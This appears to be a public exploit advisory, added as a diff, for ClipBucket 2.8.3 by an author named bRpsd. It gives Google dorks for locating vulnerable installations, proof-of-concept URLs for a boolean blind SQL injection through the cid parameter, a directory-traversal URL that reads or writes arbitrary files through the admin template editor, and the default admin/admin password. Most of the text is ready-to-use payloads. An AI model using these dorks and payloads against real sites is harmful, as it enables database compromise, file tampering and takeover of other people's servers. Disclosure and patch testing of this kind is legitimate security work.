@@ -1,0 +1,65 @@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+.:. Exploit Title > ClipBucket 2.8.3 - Multiple Vulnerabilities
+
+.:. Google Dorks .:.
+"Forged by ClipBucket"
+inurl:view_collection.php?cid=
+
+.:. Date: August 15, 2017
+
+.:. Exploit Author: bRpsd
+.:. Skype contact: vegnox
+.:. Mail contact: cy@live.no
+
+.:. Vendor Homepage > https://clipbucket.com/latest
+.:. Software Link > https://github.com/arslancb/clipbucket/archive/4829.zip
+.:. Version: 2.8.3 latest!
+.:. Tested on > Linux, on local xampp
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+
+
+Vulnerability 1: Blind SQL Injection
+
+Type: boolean
+File: /view_collection.php
+Parameter: cid
+
+
+.:. POC .:.
+
+http://localhost/view_collection.php?cid=-1 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--&type=photos [columns count]
+http://localhost/view_collection.php?cid=1 AND 1=1&type=photos [true]
+http://localhost/view_collection.php?cid=1 AND 1=2&type=photos [false]
+
+
+
+
+
+Vulnerability 2: Arbitrary File Read/Write
+
+NOTE: Access Requires Admin Privilege!
+
+File: /admin_area/template_editor.php
+Parameter: file
+
+.:. POC .:.
+
+The template editor is suppose to allow editing html/css files only, but if you modify the file parameter you can escape the template directory then view OR edit any file actually of any extension.
+
+http://localhost/admin_area/template_editor.php?dir=cb_28&file=../../../index.php&folder=layout
+
+
+
+
+
+Vulnerability 3: Default & Weak admin password
+
+When you setup the CMS, the admin password is autocomplete set as [admin] unless you change it, lazy people will skip changing that field and end up having username and password as 'admin' which is pretty easy to guess!
+
+
+
+
+
+
+-Be safe.
